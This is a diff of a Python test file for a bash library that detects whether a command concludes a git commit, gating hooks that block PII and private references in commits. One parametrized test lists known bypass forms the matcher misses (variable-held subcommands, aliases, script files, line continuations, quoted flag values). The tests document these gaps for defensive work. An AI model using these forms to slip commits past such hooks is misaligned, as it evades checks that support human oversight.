-        commit."""
+        """A `--continue` word elsewhere in COMMAND, outside the matched
+        verb's own arguments, must not read as concluding a commit."""
         assert _command_concludes_commit("git rebase origin/main && echo --continue") == 1
+
+    # The cases below cover the remaining `--continue` abbreviation
+    # alternatives in _lib_fragment_concludes_commit_shape's case statement,
+    # plus case-sensitivity and the empty command.
+
+    @pytest.mark.parametrize(
+        "abbreviation",
+        ["--c", "--co", "--con", "--conti", "--contin", "--continu"],
+    )
+    def test_broad_predicate_true_for_remaining_continue_abbreviations(
+        self, abbreviation: str
+    ) -> None:
+        assert _command_concludes_commit(f"git merge {abbreviation}") == 0
+
+    def test_broad_predicate_case_sensitive_on_continue_flag(self) -> None:
+        """`--Continue` is not one of the case statement's alternatives --
+        the match is case-sensitive, and a differently-cased spelling must
+        not be silently accepted."""
+        assert _command_concludes_commit("git merge --Continue") == 1
+
+    def test_broad_predicate_false_for_empty_command(self) -> None:
+        assert _command_concludes_commit("") == 1
+
+    # _lib_split_fragments leaves a bare `&` unsplit (GH-1063), so the shared
+    # matcher tries each `&`-separated piece of a fragment as its own command.
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "git add . & git commit -m x",
+            "git status & git merge --continue",
+        ],
+    )
+    def test_both_predicates_true_for_concluding_shape_after_single_ampersand(
+        self, command: str
+    ) -> None:
+        assert _command_concludes_commit(command) == 0
+        assert _command_concludes_marker_gated_commit(command) == 0
+
+    def test_rebase_continue_after_single_ampersand_keeps_the_rebase_carve_out(self) -> None:
+        command = "git status & git rebase --continue"
+        assert _command_concludes_commit(command) == 0
+        assert _command_concludes_marker_gated_commit(command) == 1
+
+    def test_ampersand_inside_a_quoted_global_flag_value_still_reaches_commit(self) -> None:
+        assert _command_concludes_commit('git -c "user.name=a&b" commit -m x') == 0
+        assert _command_concludes_marker_gated_commit('git -c "user.name=a&b" commit -m x') == 0
+
+    def test_fd_redirection_ampersand_does_not_conclude_a_commit(self) -> None:
+        assert _command_concludes_commit("git log 2>&1") == 1
+        assert _command_concludes_marker_gated_commit("git log 2>&1") == 1
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "sleep 1 & (git commit -m x)",
+            "(git add) & (git commit -m x)",
+            "git status &(git commit -m x)",
+            "git status & ( git commit -m x )",
+        ],
+    )
+    def test_both_predicates_true_for_parenthesized_commit_after_single_ampersand(
+        self, command: str
+    ) -> None:
+        """Each `&`-separated piece gets the same leading-`(` / trailing-`)`
+        strip a top-level fragment gets."""
+        assert _command_concludes_commit(command) == 0
+        assert _command_concludes_marker_gated_commit(command) == 0
+
+    @pytest.mark.parametrize("initial_noglob", [False, True], ids=["glob-on", "noglob-on"])
+    @pytest.mark.parametrize(
+        ("command", "expected_status"),
+        [("git status & git commit -m x", 0), ("git status & git log", 1)],
+        ids=["concluding-commit", "no-match"],
+    )
+    def test_ampersand_pass_restores_the_callers_ifs_and_noglob_state(
+        self, initial_noglob: bool, command: str, expected_status: int
+    ) -> None:
+        """Pass 2 word-splits on newlines with globbing off. It must hand
+        both settings back as it found them, on a match and on a no-match
+        input alike, or every later word-split in the sourcing hook changes."""
+        noglob_setup = "set -f; " if initial_noglob else ""
+        harness = (
+            f". {_LIB_SH}; {noglob_setup}IFS=$' \\t\\n'; "
+            '_lib_command_concludes_commit "$1"; status=$?; '
+            'case $- in *f*) glob_state=noglob;; *) glob_state=glob;; esac; '
+            '[ "$IFS" = $\' \\t\\n\' ] && ifs_restored=true || ifs_restored=false; '
+            'printf "%s|%s|%s" "$status" "$glob_state" "$ifs_restored"'
+        )
+        result = subprocess.run(
+            ["bash", "-c", harness, "bash", command], capture_output=True, text=True, check=False
+        )
+        expected_glob_state = "noglob" if initial_noglob else "glob"
+        assert result.stdout == f"{expected_status}|{expected_glob_state}|true"
+
+    @pytest.mark.parametrize("nounset", [False, True], ids=["nounset-off", "nounset-on"])
+    def test_ampersand_pass_leaves_an_unset_ifs_unset(self, nounset: bool) -> None:
+        """An unset IFS word-splits like the default; restoring it as an empty
+        string instead would disable word-splitting for every later loop in
+        the sourcing hook."""
+        nounset_setup = "set -u; " if nounset else ""
+        harness = (
+            f". {_LIB_SH}; unset IFS; {nounset_setup}"
+            '_lib_command_concludes_commit "$1"; status=$?; '
+            '[ -z "${IFS+set}" ] && ifs_state=unset || ifs_state=set; '
+            'printf "%s|%s" "$status" "$ifs_state"'
+        )
+        result = subprocess.run(
+            ["bash", "-c", harness, "bash", "git status & git commit -m x"],
+            capture_output=True, text=True, check=False,
+        )
+        assert result.stdout == "0|unset"
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            'git status && git -c "user.name=a&b" commit -a -m x',
+            'git add -A && git -C "R&D" commit -m x',
+            'git -C "a&" commit -m x',
+            'git -c "k=a&" commit -m x',
+            'git -c "&" commit -m x',
+            'git -C "&" merge --continue',
+        ],
+        ids=[
+            "quoted-ampersand-in-config-value-after-and-and",
+            "quoted-ampersand-in-directory-after-and-and",
+            "trailing-ampersand-in-directory",
+            "trailing-ampersand-in-config-value",
+            "lone-ampersand-config-value",
+            "lone-ampersand-directory-merge-continue",
+        ],
+    )
+    def test_both_predicates_true_for_a_quoted_ampersand_inside_a_global_flag_value(
+        self, command: str
+    ) -> None:
+        """Quote-stripping leaves the `&` inside the flag's value, which must
+        not cut `git` from its subcommand."""
+        assert _command_concludes_commit(command) == 0
+        assert _command_concludes_marker_gated_commit(command) == 0
+
+    @pytest.mark.parametrize(
+        "command",
+        ['bash -c "git commit -m x"', 'eval "git commit -m x"'],
+    )
+    def test_quoted_wrapper_text_naming_a_commit_is_recognized(self, command: str) -> None:
+        """Quote-stripping leaves `git commit` as bare words inside a
+        `bash -c` or `eval` string, so the wrapper does not hide it."""
+        assert _command_concludes_commit(command) == 0
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "c=commit; git $c -m x",
+            "git ci -m x",
+            "bash ./do-commit.sh",
+            "git \\\ncommit -m x",
+            'git -c "user.name=A B" commit -m x',
+            'git -C "dir with space" commit -m x',
+            'git -C "$(pwd)" commit -m x',
+            'git -C "$(git rev-parse --show-toplevel)" commit -m x',
+            'git -C $(pwd) commit -m x',
+            'git --git-dir="a b" commit -m x',
+        ],
+        ids=[
+            "variable-word",
+            "git-alias",
+            "script-file",
+            "backslash-newline-continuation",
+            "quoted-space-in-global-flag-value",
+            "quoted-space-in-dash-C-value",
+            "command-substitution-in-dash-C-value",
+            "rev-parse-toplevel-substitution-in-dash-C-value",
+            "unquoted-command-substitution-in-dash-C-value",
+            "quoted-space-in-attached-git-dir-value",
+        ],
+    )
+    def test_known_bypass_commit_text_assembled_outside_the_command_string_is_not_recognized(
+        self, command: str
+    ) -> None:
+        """A commit whose words never appear together in the command text
+        (a variable, an alias, a script file, a line continuation, a
+        whitespace or fragment-operator value of a global flag that precedes
+        the subcommand) is a documented residual of matching command text;
+        pinned so a later fix flips it deliberately."""
+        assert _command_concludes_commit(command) == 1
+
+    # The matcher is a quote-blind word walk over quote-stripped text, so a
+    # command that only names a commit command as an argument, or quotes an
+    # `&` inside another command's argument, is read as concluding one. That
+    # over-match is the accepted fail-toward-deny posture; each case below pins
+    # it so a later narrowing flips these deliberately.
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "echo git commit",
+            'grep "git commit" docs/x.md',
+            "man git commit",
+            'git log --grep "fix & git commit hook"',
+        ],
+        ids=["echo-argument", "grep-quoted-argument", "man-argument", "quoted-ampersand-in-argument"],
+    )
+    def test_accepted_over_match_command_naming_a_commit_reaches_both_predicates(
+        self, command: str
+    ) -> None:
+        assert _command_concludes_commit(command) == 0
+        assert _command_concludes_marker_gated_commit(command) == 0
+
+
+class TestSplitFragmentsPipefailContract:
+    """_lib_split_fragments' first sed stage failing leaves the second stage
+    reading empty input and succeeding, so the pipeline reports the failure
+    only under `set -o pipefail`; the call-site contract in its header
+    requires a sourcing caller to set it."""
+
+    @pytest.mark.parametrize(
+        ("pipefail_setting", "expected_status"),
+        [("set -o pipefail", 1), ("set +o pipefail", 0)],
+        ids=["pipefail-on-reports-failure", "pipefail-off-hides-failure"],
+    )
+    def test_first_stage_only_failure_is_reported_only_under_pipefail(
+        self, pipefail_setting: str, expected_status: int
+    ) -> None:
+        harness = (
+            f". {_LIB_SH}; {pipefail_setting}; "
+            # Fails only the first stage, keyed on its script starting `s/;/`.
+            "sed() { case \"$2\" in 's/;/'*) return 1;; esac; command sed \"$@\"; }; "
+            'fragments=$(_lib_split_fragments "git add . ; git status"); '
+            'printf "%s|%s" "$?" "$fragments"'
+        )
+        result = subprocess.run(["bash", "-c", harness], capture_output=True, text=True, check=False)
+        assert result.stdout == f"{expected_status}|"
+
+
+def _fragment_concludes_commit_via_extraction(fragment: str, env: dict | None = None) -> int:
+    """Mirrors what deny-invisible-commit-content.sh's arm 1 and arm 2 each
+    do: extract the fragment's own subcommand, then feed FRAGMENT and that
+    SUBCMD to _lib_fragment_concludes_commit -- rather than a hand-picked
+    SUBCMD, so a regression in the extraction step itself would also show
+    up here."""
+    result = subprocess.run(
+        [
+            "bash", "-c",
+            f'. {_LIB_SH}; subcmd=$(_lib_extract_git_subcmd "$1"); _lib_fragment_concludes_commit "$1" "$subcmd"',
+            "bash", fragment,
+        ],
+        capture_output=True,
+        text=True,
+        check=False,
+        env=env if env is not None else dict(os.environ),
+    )
+    return result.returncode
+
+
+class TestFragmentConcludesCommit:
+    """Differential coverage for _lib_fragment_concludes_commit_shape, which
+    deny-invisible-commit-content.sh's arm 1 (raw/stripped-text SUBCMD
+    extraction) and arm 2 (masked-text SUBCMD extraction) share. Asserts the
+    fragment-level answer, via its public _lib_fragment_concludes_commit
+    wrapper, agrees with the command-level predicate's answer for the
+    equivalent single-fragment command."""
+
+    @pytest.mark.parametrize(
+        "fragment",
+        [
+            "git commit",
+            "git -c core.editor=true commit",
+            "git merge --continue",
+            "git rebase --continue",
+            "git cherry-pick --continue",
+            "git revert --continue",
+            "git merge --c",
+            "git merge --continu",
+        ],
+    )
+    def test_true_matches_command_level_predicate(self, fragment: str) -> None:
+        assert _fragment_concludes_commit_via_extraction(fragment) == 0
+        assert _command_concludes_commit(fragment) == 0
+
+    @pytest.mark.parametrize(
+        "fragment",
+        [
+            "git status",
+            "git rebase --abort",
+            "git rebase --skip",
+            "git merge origin/main",
+            "git cherry-pick abc123",
+        ],
+    )
+    def test_false_matches_command_level_predicate(self, fragment: str) -> None:
+        assert _fragment_concludes_commit_via_extraction(fragment) == 1
+        assert _command_concludes_commit(fragment) == 1
+
+
+def _fragment_concludes_commit_via_arm(fragment: str, transform: str, env: dict | None = None) -> int:
+    """Runs one of deny-invisible-commit-content.sh's two real arm
+    pipelines: TRANSFORM='strip' applies _lib_strip_shell_quotes (arm 1's
+    own transform) and TRANSFORM='mask' applies _lib_mask_shell_quotes
+    (arm 2's own transform) to FRAGMENT before extracting SUBCMD and
+    feeding both to _lib_fragment_concludes_commit -- so a quoted fixture
+    actually exercises the transform each arm runs, not a bypass of both."""
+    transform_fn = "_lib_strip_shell_quotes" if transform == "strip" else "_lib_mask_shell_quotes"
+    result = subprocess.run(
+        [
+            "bash", "-c",
+            f'. {_LIB_SH}; transformed=$({transform_fn} "$1"); '
+            'subcmd=$(_lib_extract_git_subcmd "$transformed"); '
+            '_lib_fragment_concludes_commit "$transformed" "$subcmd"',
+            "bash", fragment,
+        ],
+        capture_output=True,
+        text=True,
+        check=False,
+        env=env if env is not None else dict(os.environ),
+    )
+    return result.returncode
+
+
+class TestFragmentConcludesCommitQuotedDifferential:
+    """Fragment-level answers agree with the whole-command predicate on
+    quoted input. These fixtures carry a quoted `git` word and a quoted,
+    abbreviated `--continue` form for a non-merge/rebase verb, so arm 1's
+    quote-stripped extraction and arm 2's quote-masked extraction each run
+    for real and must agree with each other and with the command-level
+    predicate's answer for the equivalent whole command."""
+
+    @pytest.mark.parametrize(
+        "fragment,expected",
+        [
+            ('"git" cherry-pick "--c"', 0),
+            ('"git" revert "--c"', 0),
+            ('"git" cherry-pick abc123', 1),
+        ],
+    )
+    def test_stripped_and_masked_arms_agree_with_command_level_predicate(
+        self, fragment: str, expected: int
+    ) -> None:
+        stripped_result = _fragment_concludes_commit_via_arm(fragment, "strip")
+        masked_result = _fragment_concludes_commit_via_arm(fragment, "mask")
+        assert stripped_result == masked_result == _command_concludes_commit(fragment) == expected
 
 
 # --- _lib_git_inprogress_state / _lib_gate_diff_base / _lib_staged_diff_hash --
@@ -6793,7 +7752,7 @@ def _git_supports_sha256_object_format() -> bool:
 class TestGitInprogressStateDetection:
     def test_detects_merge(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_merge(repo)
         result = _git_inprogress_state(repo)
         assert result.returncode == 0
@@ -6801,7 +7760,7 @@ class TestGitInprogressStateDetection:
 
     def test_detects_cherry_pick(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_cherry_pick(repo)
         result = _git_inprogress_state(repo)
         assert result.returncode == 0
@@ -6809,7 +7768,7 @@ class TestGitInprogressStateDetection:
 
     def test_detects_revert(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_revert(repo)
         result = _git_inprogress_state(repo)
         assert result.returncode == 0
@@ -6817,7 +7776,7 @@ class TestGitInprogressStateDetection:
 
     def test_detects_rebase_plain(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_rebase(repo)
         result = _git_inprogress_state(repo)
         assert result.returncode == 0
@@ -6833,7 +7792,7 @@ class TestGitInprogressStateDetection:
         here, alongside a genuine conflicted interactive rebase for the
         rebase half."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         feature_tip = build_conflicted_rebase(repo, interactive=True)
         gitdir = repo / ".git"
         (gitdir / "CHERRY_PICK_HEAD").write_text(feature_tip + "\n")
@@ -6843,14 +7802,14 @@ class TestGitInprogressStateDetection:
 
     def test_no_state_in_ordinary_repo(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         result = _git_inprogress_state(repo)
         assert result.returncode == 1
         assert result.stdout == ""
 
     def test_undetermined_when_git_missing(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         farm_dir = tmp_path / "path-without-git"
         farm_dir.mkdir()
         restricted_path = build_path_without("git", farm_dir)
@@ -6880,7 +7839,7 @@ class TestGitInprogressStateDetection:
         pair but rebase-vs-cherry-pick, which the previous test covers with
         a real fixture."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         gitdir = repo / ".git"
         head = _run_git(repo, "rev-parse", "HEAD").strip()
         _forge_state_marker(gitdir, higher, head)
@@ -6909,7 +7868,7 @@ def test_build_conflicted_rebase_pre_resolution_checkpoint_has_all_three_stages(
     ancestor. `git ls-files --unmerged` reports one line per populated
     stage for the conflicted path."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     build_conflicted_rebase(repo)
     unmerged = _run_git(repo, "ls-files", "--unmerged")
     stages = {line.split()[2] for line in unmerged.splitlines() if line}
@@ -6921,7 +7880,7 @@ def test_resolve_conflicted_rebase_advances_to_staged_checkpoint(tmp_path: Path)
     stage 1/2/3 entries) and post-resolution (staged, ready for
     `git rebase --continue`)."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     build_conflicted_rebase(repo)
     resolve_conflicted_rebase(repo)
     status = _run_git(repo, "status", "--porcelain=v1")
@@ -6943,11 +7902,13 @@ def test_git_diff_cached_against_unresolved_conflict_git_primitive_fact(
 ) -> None:
     """What `git diff --cached` does against an index still carrying
     unmerged (stage 1/2/3) entries, pinned as a git-primitive fact
-    independent of any hook. A later change wiring deny-pii-in-commits.sh
-    onto `git rebase --continue` recognition needs an end-to-end hook-level
-    version of this same assertion, once that routing exists."""
+    independent of any hook. deny-pii-in-commits.sh and
+    deny-private-project-refs.sh both route `git rebase --continue`, and
+    their hook-level counterparts are
+    test_continue_at_unresolved_conflict_checkpoint_is_a_clean_passthrough in
+    test_deny_pii_in_commits.py and test_deny_private_project_refs.py."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     build_conflicted_rebase(repo)  # pre-`git add` checkpoint: unresolved
     result = subprocess.run(
         ["git", "diff", "--cached"], cwd=repo, capture_output=True, text=True
@@ -6966,7 +7927,7 @@ def test_git_diff_cached_against_unresolved_conflict_git_primitive_fact(
 class TestGateDiffBaseNoState:
     def test_no_state_exits_1_with_empty_base(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         (repo / "f.txt").write_text("y\n")
         _run_git(repo, "add", "f.txt")
         result = _gate_diff_base(repo)
@@ -6980,7 +7941,7 @@ class TestGateDiffBaseNoState:
         _lib_staged_diff_hash must produce the exact byte-identical digest
         today's production `git diff --cached | sha256sum` recipe does."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         (repo / "f.txt").write_text("y\n")
         _run_git(repo, "add", "f.txt")
         result = _staged_diff_hash(repo, "")
@@ -7046,7 +8007,7 @@ class TestGateDiffBaseTrustedAnchor:
         """REVERT_HEAD is an ancestor of HEAD by construction, so a
         genuine revert always trusts via the HEAD anchor."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_revert(repo)
         base_result = _gate_diff_base(repo)
         assert base_result.returncode == 0
@@ -7127,7 +8088,7 @@ class TestGateDiffBaseAnchorNamespaceShadow:
         self, tmp_path: Path, shadow_kind: str, has_remote_tracking_ref: bool, state: str
     ) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         _run_git(repo, "checkout", "-qb", "side")
         (repo / "f.txt").write_text("unreviewed\n")
         _run_git(repo, "add", "f.txt")
@@ -7161,7 +8122,7 @@ class TestGateDiffBaseUntrustedAnchor:
         -- the right answer, since that content genuinely has not been
         reviewed on this branch."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_cherry_pick(repo)
         result = _gate_diff_base(repo)
         assert result.returncode == 1
@@ -7175,7 +8136,7 @@ class TestGateDiffBaseUntrustedAnchor:
         -- an orphan-history commit, sharing no ancestry with the
         checked-out branch at all -- must not be trusted."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         _run_git(repo, "checkout", "-q", "--orphan", "orphan")
         (repo / "orphan.txt").write_text("z\n")
         _run_git(repo, "add", "orphan.txt")
@@ -7198,7 +8159,7 @@ class TestGateDiffBaseUntrustedAnchor:
         narrow (exactly main/master/develop, never a refs/remotes/* pattern)
         and never resolves to this name."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         _run_git(repo, "checkout", "-qb", "side")
         (repo / "f.txt").write_text("side\n")
         _run_git(repo, "add", "f.txt")
@@ -7226,7 +8187,7 @@ class TestGateDiffBaseUntrustedAnchor:
         state_oid's shape guard, so it can't prove the guard is
         load-bearing."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         _forge_state_marker(repo / ".git", state, "HEAD")
         result = _gate_diff_base(repo)
         assert result.returncode == 1
@@ -7236,7 +8197,7 @@ class TestGateDiffBaseUntrustedAnchor:
 class TestGateDiffBaseTopologyFallback:
     def test_octopus_merge_falls_back_to_empty_base(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_octopus_merge_conflict(repo)
         result = _gate_diff_base(repo)
         assert result.returncode == 1
@@ -7255,7 +8216,7 @@ class TestGateDiffBaseTopologyFallback:
         must still fall back to the empty base -- not treat line 1's own
         trust as good enough for the whole value."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         trusted_oid = _run_git(repo, "rev-parse", "HEAD").strip()
         _run_git(repo, "checkout", "-qb", "untrusted-line")
         (repo / "f.txt").write_text("untrusted\n")
@@ -7276,7 +8237,7 @@ class TestGateDiffBaseTopologyFallback:
         erroring. Closed because the replayed merge commit reaches neither
         anchor, not by a second mechanism."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_rebase_merges_replay_conflict(repo)
         result = _gate_diff_base(repo)
         assert result.returncode == 1
@@ -7290,7 +8251,7 @@ class TestMergeBaseIsAncestorPrimitiveContract:
 
     def test_ancestor_returns_zero(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         first = _run_git(repo, "rev-parse", "HEAD").strip()
         (repo / "f.txt").write_text("y\n")
         _run_git(repo, "add", "f.txt")
@@ -7302,7 +8263,7 @@ class TestMergeBaseIsAncestorPrimitiveContract:
 
     def test_non_ancestor_returns_nonzero(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         _run_git(repo, "checkout", "-qb", "side")
         (repo / "f.txt").write_text("side\n")
         _run_git(repo, "add", "f.txt")
@@ -7316,7 +8277,7 @@ class TestMergeBaseIsAncestorPrimitiveContract:
 
     def test_unresolvable_oid_returns_nonzero(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         result = subprocess.run(
             ["git", "merge-base", "--is-ancestor", "0" * 40, "HEAD"], cwd=repo, capture_output=True
         )
@@ -7328,7 +8289,7 @@ def test_git_diff_cached_accepts_bare_tree_oid(tmp_path: Path) -> None:
     staged content against it directly -- pins that `git diff --cached`
     accepts one."""
     repo = tmp_path / "repo"
-    _init_repo_on_branch(repo, "main")
+    init_git_repo_with_commit(repo, branch="main")
     tree_oid = _run_git(repo, "rev-parse", "HEAD^{tree}").strip()
     (repo / "f.txt").write_text("y\n")
     _run_git(repo, "add", "f.txt")
@@ -7539,7 +8500,7 @@ class TestGateDiffBaseGitVersionFallback:
         self, tmp_path: Path
     ) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_revert(repo)
         bin_dir = tmp_path / "bin-reject-write-tree"
         _make_git_rejecting_write_tree(bin_dir)
@@ -7550,7 +8511,7 @@ class TestGateDiffBaseGitVersionFallback:
 
     def test_merge_base_flag_rejected_falls_back_to_empty_base(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_revert(repo)  # revert's merge-tree call uses --merge-base=
         bin_dir = tmp_path / "bin-reject-merge-base"
         _make_git_rejecting_merge_base_flag(bin_dir)
@@ -7568,7 +8529,7 @@ class TestGateDiffBaseGitVersionFallback:
         version-specific stub, so the merge-tree call this design issues
         fails the same way the stubbed-rejection bands above do."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         root_oid = _run_git(repo, "rev-parse", "HEAD").strip()
         (repo / "f.txt").write_text("y\n")
         _run_git(repo, "add", "f.txt")
@@ -7597,7 +8558,7 @@ class TestGateDiffBaseCapFaultInjection:
         status. timeout=30 bounds a cap regression to a fast failure
         instead of a 20s hang (the shim's own sleep)."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_revert(repo)
         bin_dir = tmp_path / "bin-blocking-merge-tree"
         _make_blocking_merge_tree_git(bin_dir)
@@ -7618,7 +8579,7 @@ class TestGateDiffBaseCapFaultInjection:
         call -- its own independent `|| return 2` must not let a partial
         gitdir escape onto stdout either."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         bin_dir = tmp_path / "bin-blocking-absolute-git-dir"
         _make_blocking_absolute_git_dir_git(bin_dir)
         env = {**os.environ, "PATH": f"{bin_dir}:{os.environ['PATH']}", "REAL_GIT": shutil.which("git")}
@@ -7639,7 +8600,7 @@ class TestGateDiffBaseCapFaultInjection:
         exit-code-match block must not let the unvalidated tree_oid escape
         onto stdout either."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_revert(repo)
         bin_dir = tmp_path / "bin-blocking-tree-verify"
         _make_blocking_tree_verify_git(bin_dir)
@@ -7666,7 +8627,7 @@ class TestGateDiffBaseCapKillStatusesAreUndetermined:
         self, tmp_path: Path, arg_pattern: str, cap_kill_status: int
     ) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_revert(repo)
         bin_dir = tmp_path / "bin-exiting-with-status"
         _make_git_exiting_with_status(bin_dir, arg_pattern, cap_kill_status)
@@ -7686,7 +8647,7 @@ class TestGateDiffBaseMergeTreeSkippedWhenAnchorFails:
         every ordinary conflicted rebase, the exact arm this design newly
         gates."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_cherry_pick(repo)  # source never pushed: untrusted
         log_file = tmp_path / "git-calls.log"
         bin_dir = tmp_path / "bin-logging"
@@ -7711,7 +8672,7 @@ class TestGateDiffBaseSingleCallInvocationCount:
         self, tmp_path: Path
     ) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_revert(repo)  # HEAD-anchor trusted, no origin configured
         log_file = tmp_path / "git-calls.log"
         bin_dir = tmp_path / "bin-logging"
@@ -7739,7 +8700,7 @@ class TestGateDiffBaseNoCapBinary:
         actually degrades to running uncapped, not only that the capped
         path works."""
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_revert(repo)
         farm_dir = tmp_path / "path-without-timeout"
         farm_dir.mkdir()
@@ -7794,7 +8755,7 @@ class TestReviewerRoundStateKeyDuringRebase:
 
     def test_plain_rebase_leaves_head_detached(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_rebase(repo)
         symbolic_ref = subprocess.run(
             ["git", "symbolic-ref", "-q", "--short", "HEAD"], cwd=repo, capture_output=True
@@ -7804,7 +8765,7 @@ class TestReviewerRoundStateKeyDuringRebase:
 
     def test_interactive_rebase_leaves_head_detached(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         build_conflicted_rebase(repo, interactive=True)
         symbolic_ref = subprocess.run(
             ["git", "symbolic-ref", "-q", "--short", "HEAD"], cwd=repo, capture_output=True
@@ -7816,7 +8777,7 @@ class TestReviewerRoundStateKeyDuringRebase:
 class TestStagedDiffHash:
     def test_empty_base_matches_production_recipe(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         (repo / "f.txt").write_text("changed\n")
         _run_git(repo, "add", "f.txt")
         result = _staged_diff_hash(repo, "")
@@ -7825,7 +8786,7 @@ class TestStagedDiffHash:
 
     def test_non_empty_base_matches_independent_oracle(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         tree_oid = _run_git(repo, "rev-parse", "HEAD^{tree}").strip()
         (repo / "f.txt").write_text("changed\n")
         _run_git(repo, "add", "f.txt")
@@ -7835,7 +8796,7 @@ class TestStagedDiffHash:
 
     def test_pathspec_restricts_diff(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         (repo / "other.txt").write_text("z\n")
         _run_git(repo, "add", "other.txt")
         _run_git(repo, "commit", "-qm", "add other.txt")
@@ -7852,7 +8813,7 @@ class TestStagedDiffHash:
 
     def test_sha256sum_absent_returns_empty_and_fails_closed(self, tmp_path: Path) -> None:
         repo = tmp_path / "repo"
-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         (repo / "f.txt").write_text("changed\n")
         _run_git(repo, "add", "f.txt")
         farm_dir = tmp_path / "path-without-sha256sum"
@@ -7876,7 +8837,7 @@ class TestStagedDiffHash:
         hashed onto stdout. timeout=30 bounds a cap regression to a fast
         failure instead of a 20s hang (the shim's own sleep)."""
         repo = tmp_path / "repo"
